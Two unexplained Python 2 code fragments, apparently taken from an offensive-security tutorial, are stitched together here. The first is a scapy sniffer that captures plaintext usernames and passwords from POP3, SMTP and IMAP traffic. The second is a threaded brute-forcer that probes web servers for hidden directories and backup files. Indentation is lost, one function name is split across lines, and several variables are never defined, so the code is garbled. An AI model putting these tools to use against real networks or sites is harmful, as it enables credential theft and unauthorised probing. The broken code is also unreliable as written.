from scapy.all import *
# our packet callback
def packet_callback(packet):
if packet[TCP].payload:
mail_packet = str(packet[TCP].payload)
if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
print "[*] Server: %s" % packet[IP].dst
print "[*] %s" % packet[TCP].payload
# fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_
callback,store=0)

def dir_bruter(word_queue,extensions=None):
while not word_queue.empty():
attempt = word_queue.get()
attempt_list = []
# check to see if there is a file extension; if not,
# it's a directory path we're bruting
if "." not in attempt:
attempt_list.append("/%s/" % attempt)
else:
attempt_list.append("/%s" % attempt)

# if we want to bruteforce extensions
if extensions:
for extension in extensions:
attempt_list.append("/%s%s" % (attempt,extension))
# iterate over our list of attempts
for brute in attempt_list:
url = "%s%s" % (target_url,urllib.quote(brute))
try:
headers = {}
headers["User-Agent"] = user_agent
r = urllib2.Request(url,headers=headers)
response = urllib2.urlopen(r)
if len(response.read()):
print "[%d] =&gt; %s" % (response.code,url)
except urllib2.URLError,e:
if hasattr(e, 'code') and e.code != 404:
print "!!! %d =&gt; %s" % (e.code,url)
pass

word_queue = build_wordlist(wordlist_file)
extensions = [".php",".bak",".orig",".inc"]
for i in range(threads):
t = threading.Thread(target=dir_bruter,args=(word_queue,extensions,))
t.start()
